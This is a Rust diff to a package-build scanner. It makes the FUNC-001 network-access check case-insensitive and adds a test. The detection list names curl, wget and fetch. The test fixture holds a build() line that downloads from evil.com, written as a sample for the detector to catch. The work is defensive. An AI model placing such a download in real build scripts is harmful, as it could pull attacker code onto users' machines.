@@ -118,13 +118,15 @@ impl PatternAnalyzer {
                 ("fetch", "Network access in build function"),
             ];
 
+            // Match case-insensitively so a `CURL`/`Wget` case variant cannot
+            // evade FUNC-001 (audit HI-6). The patterns are lowercase command
+            // names, so lower-casing the body once is sufficient and correct.
+            let body_lc = func_body.content.to_lowercase();
             for (pattern, message) in &network_patterns {
-                if func_body.content.contains(pattern)
-                    && !func_body.content.contains(&format!("# {}", pattern))
-                {
+                if body_lc.contains(pattern) && !body_lc.contains(&format!("# {}", pattern)) {
                     // Check if it's actually a download command (not a variable)
-                    if func_body.content.contains(&format!("{} ", pattern))
-                        || func_body.content.contains(&format!("${}", pattern))
+                    if body_lc.contains(&format!("{} ", pattern))
+                        || body_lc.contains(&format!("${}", pattern))
                     {
                         findings.push(Finding {
                             id: "FUNC-001".to_string(),
@@ -195,6 +197,22 @@ build() {
         let findings = analyzer.analyze(&context).await.unwrap();
         assert!(!findings.is_empty());
         assert!(findings.iter().any(|f| f.id == "DLE-001"));
+    }
+
+    #[tokio::test]
+    async fn func001_case_variation_still_flags() {
+        // Audit HI-6: FUNC-001 matches the build/package body case-insensitively,
+        // so `CURL` in build() must still flag network access.
+        let rule_engine = Arc::new(RuleEngine::default());
+        let analyzer = PatternAnalyzer::new(rule_engine);
+        let context = create_test_context(
+            "pkgname=test\npkgver=1.0\npkgrel=1\nbuild() {\n    CURL https://evil.com/x -o out\n}\n",
+        );
+        let findings = analyzer.analyze(&context).await.unwrap();
+        assert!(
+            findings.iter().any(|f| f.id == "FUNC-001"),
+            "uppercase CURL in build() must still raise FUNC-001: {findings:?}"
+        );
     }
 
     #[tokio::test]
